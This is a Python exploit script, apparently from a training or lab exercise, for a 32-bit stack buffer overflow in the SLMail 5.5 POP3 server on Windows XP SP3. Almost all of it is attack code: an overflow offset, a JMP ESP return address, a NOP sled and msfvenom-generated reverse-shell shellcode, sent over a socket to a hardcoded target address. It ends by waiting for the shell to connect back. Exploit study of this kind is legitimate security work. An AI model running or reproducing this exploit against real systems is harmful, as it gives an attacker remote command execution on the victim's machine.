# SLMail Exploit Proof of Concept
# Author: @Pink_P4nther
# Windows Stack Based Buffer Overflow 32-Bit
# Target: Windows XP SP3 32-Bit
# Vulnerable app: https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe

import socket

# Offset of 4,659 Bytes
offset = "A"*4659

# JMP ESP instruction gadget at 0x77559c77
addr = "\x77\x9c\x55\x77"

# 80 NOP instructions
nop = "\x90"*80

# Payload 
# msfvenom -p windows/shell/reverse_tcp_allports LHOST=eth0 LPORT=80 EXITFUNC=thread EXITONSESSION=false -b '\x00\x0d\x0a\xff' -f py
buf =  ""
buf += "\xbe\xdd\x2d\xab\x9d\xd9\xee\xd9\x74\x24\xf4\x58\x33"
buf += "\xc9\xb1\x47\x83\xe8\xfc\x31\x70\x10\x03\x70\x10\x3f"
buf += "\xd8\x57\x75\x3d\x23\xa8\x86\x21\xad\x4d\xb7\x61\xc9"
buf += "\x06\xe8\x51\x99\x4b\x05\x1a\xcf\x7f\x9e\x6e\xd8\x70"
buf += "\x17\xc4\x3e\xbe\xa8\x74\x02\xa1\x2a\x86\x57\x01\x12"
buf += "\x49\xaa\x40\x53\xb7\x47\x10\x0c\xbc\xfa\x85\x39\x88"
buf += "\xc6\x2e\x71\x1d\x4f\xd2\xc2\x1c\x7e\x45\x58\x47\xa0"
buf += "\x67\x8d\xfc\xe9\x7f\xd2\x38\xa3\xf4\x20\xb7\x32\xdd"
buf += "\x78\x38\x98\x20\xb5\xcb\xe0\x65\x72\x33\x97\x9f\x80"
buf += "\xce\xa0\x5b\xfa\x14\x24\x78\x5c\xdf\x9e\xa4\x5c\x0c"
buf += "\x78\x2e\x52\xf9\x0e\x68\x77\xfc\xc3\x02\x83\x75\xe2"
buf += "\xc4\x05\xcd\xc1\xc0\x4e\x96\x68\x50\x2b\x79\x94\x82"
buf += "\x94\x26\x30\xc8\x39\x33\x49\x93\x55\xf0\x60\x2c\xa6"
buf += "\x9e\xf3\x5f\x94\x01\xa8\xf7\x94\xca\x76\x0f\xda\xe1"
buf += "\xcf\x9f\x25\x09\x30\x89\xe1\x5d\x60\xa1\xc0\xdd\xeb"
buf += "\x31\xec\x08\xbb\x61\x42\xe2\x7c\xd2\x22\x52\x15\x38"
buf += "\xad\x8d\x05\x43\x67\xa6\xae\x10\x9b\xdb\xd3\x01\x9e"
buf += "\xdb\x2b\x82\x17\x3d\x41\x32\x7e\x96\xfe\xab\xdb\x6c"
buf += "\x9e\x34\xf6\x09\xa0\xbf\xf6\x77\xaa\x06\x0b\xf1\x4c"
buf += "\xc6\x8d\x1d\xea\x4e\xd7\xdf\x18\xb2\xb2\xdf\xb4\x37"
buf += "\x15\x88\x20\x3a\x40\xfe\xee\xc5\xa7\x75\x26\x50\x08"
buf += "\xe1\x47\xb4\x88\xf1\x11\xde\x88\x99\xc5\xba\xda\xbc"
buf += "\x09\x17\x4f\x6d\x9c\x98\x26\xc2\x37\xf1\xc4\x3d\x7f"
buf += "\x5e\x36\x68\x81\xa2\xe1\x54\xf7\xca\x31"

# Create socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to target POP3 server
s.connect(("172.19.19.52",110))

# Send USER login buffer and receive buffer
s.send("USER pinky\r\n")
msg = s.recv(4096)
print("[+] {}".format(str(msg)))

# Send payload [offset + addr + nop + buf] + \r\n
s.send(offset+addr+nop+buf+"\r\n")
print("[!] Payload Sent!")

# Receive response
msg = s.recv(4096)
print("[+] {}".format(msg))

# Clean up
print("[!!!] Wait for shell!")
s.close()
